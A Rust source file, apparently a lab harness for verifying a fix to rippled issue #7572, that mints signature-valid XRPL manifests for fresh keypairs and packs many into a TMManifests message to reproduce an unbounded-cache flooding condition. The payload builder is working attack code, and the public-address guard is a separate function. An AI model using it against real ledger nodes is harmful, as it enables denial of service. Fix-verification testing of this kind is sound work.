//! LAB-ONLY fix-verification harness for XRPLF/rippled#7572 (untrusted-manifest
//! flooding, patched in xrpld 3.2.1). Mints signature-valid manifests for fresh
//! keypairs and packs them into a TMManifests (mtMANIFESTS) message so a node with
//! no trust gate accepts them — reproducing the unbounded-cache condition to confirm
//! the 3.2.1 caps reject it.
//!
//! CONTAINMENT: `ensure_lab_target` refuses any destination that is not loopback or
//! RFC1918/CGNAT/link-local private. This tool CANNOT be aimed at a public mainnet
//! peer without editing the source. Run only against an isolated lab net you operate.
//!
//! Inverse of `manifest::parse_manifest` / `verify_manifest_chain`.

use ed25519_dalek::{Signer, SigningKey};
use std::net::{IpAddr, ToSocketAddrs};

/// Structural guard: only loopback or private/CGNAT/link-local targets are permitted.
/// Any public address returns an error, which the caller turns into an abort. This is
/// what keeps the harness lab-only.
pub fn ensure_lab_target(host_port: &str) -> Result<(), String> {
    let mut any = false;
    for addr in host_port
        .to_socket_addrs()
        .map_err(|e| format!("resolve {host_port}: {e}"))?
    {
        any = true;
        let ip = addr.ip();
        let ok = match ip {
            IpAddr::V4(v4) => {
                let o = v4.octets();
                v4.is_loopback()
                    || v4.is_private()
                    || v4.is_link_local()
                    || (o[0] == 100 && (64..=127).contains(&o[1])) // 100.64/10 CGNAT
            }
            IpAddr::V6(v6) => v6.is_loopback() || (v6.segments()[0] & 0xfe00) == 0xfc00,
        };
        if !ok {
            return Err(format!(
                "REFUSED: {host_port} resolves to public address {ip}. \
                 This harness only targets loopback/private lab nodes."
            ));
        }
    }
    if !any {
        return Err(format!("no address resolved for {host_port}"));
    }
    Ok(())
}

/// XRPL variable-length blob size prefix. We only ever emit short blobs (33-byte
/// keys, 64-byte signatures), all <= 192, so a single length byte suffices.
fn vl_len(n: usize) -> Vec<u8> {
    assert!(n <= 192, "vl_len only handles short blobs");
    vec![n as u8]
}

/// Encode one Blob (type 7) field: header, VL length, data.
fn blob_field(field: u16, data: &[u8]) -> Vec<u8> {
    let mut out = Vec::new();
    if field <= 15 {
        out.push((7 << 4) | field as u8);
    } else {
        out.push(7 << 4); // low nibble 0 => field id in next byte
        out.push(field as u8);
    }
    out.extend_from_slice(&vl_len(data.len()));
    out.extend_from_slice(data);
    out
}

/// Encode the UInt32 Sequence field (type 2, field 4).
fn seq_field(seq: u32) -> Vec<u8> {
    let mut out = vec![(2 << 4) | 4];
    out.extend_from_slice(&seq.to_be_bytes());
    out
}

fn ed_pubkey_33(sk: &SigningKey) -> Vec<u8> {
    let mut v = vec![0xEDu8];
    v.extend_from_slice(&sk.verifying_key().to_bytes());
    v
}

fn rand_seed() -> [u8; 32] {
    let mut b = [0u8; 32];
    openssl::rand::rand_bytes(&mut b).expect("rand");
    b
}

/// Build one signature-valid manifest STObject for a fresh keypair.
pub fn mint_manifest(seq: u32) -> Vec<u8> {
    let master = SigningKey::from_bytes(&rand_seed());
    let signing = SigningKey::from_bytes(&rand_seed());

    let master_pk = ed_pubkey_33(&master);
    let signing_pk = ed_pubkey_33(&signing);

    // Signed region: "MAN\0" + Sequence + PublicKey + SigningPubKey.
    let seq_enc = seq_field(seq);
    let pk_enc = blob_field(1, &master_pk);
    let spk_enc = blob_field(3, &signing_pk);
    let mut region = b"MAN\0".to_vec();
    region.extend_from_slice(&seq_enc);
    region.extend_from_slice(&pk_enc);
    region.extend_from_slice(&spk_enc);

    // ed25519 signs the raw region (matches manifest::xrpl_verify for 0xED keys).
    let sig = signing.sign(&region).to_bytes().to_vec();
    let master_sig = master.sign(&region).to_bytes().to_vec();

    // Full STObject in canonical order: Seq, PublicKey(1), SigningPubKey(3),
    // Signature(6), MasterSignature(18).
    let mut obj = Vec::new();
    obj.extend_from_slice(&seq_enc);
    obj.extend_from_slice(&pk_enc);
    obj.extend_from_slice(&spk_enc);
    obj.extend_from_slice(&blob_field(6, &sig));
    obj.extend_from_slice(&blob_field(18, &master_sig));
    obj
}

/// protobuf varint.
fn varint(mut v: usize) -> Vec<u8> {
    let mut out = Vec::new();
    loop {
        let mut byte = (v & 0x7f) as u8;
        v >>= 7;
        if v != 0 {
            byte |= 0x80;
        }
        out.push(byte);
        if v == 0 {
            break;
        }
    }
    out
}

/// Build a TMManifests payload with `n` freshly minted untrusted manifests.
/// TMManifests { repeated TMManifest list = 1 }, TMManifest { bytes stobject = 1 }.
pub fn build_manifests_message(n: usize) -> Vec<u8> {
    let mut payload = Vec::new();
    for i in 0..n {
        let obj = mint_manifest(1 + i as u32);
        // inner TMManifest: field 1 (stobject), wire type 2
        let mut inner = vec![0x0Au8];
        inner.extend_from_slice(&varint(obj.len()));
        inner.extend_from_slice(&obj);
        // outer list entry: field 1 (list), wire type 2
        payload.push(0x0Au8);
        payload.extend_from_slice(&varint(inner.len()));
        payload.extend_from_slice(&inner);
    }
    payload
}
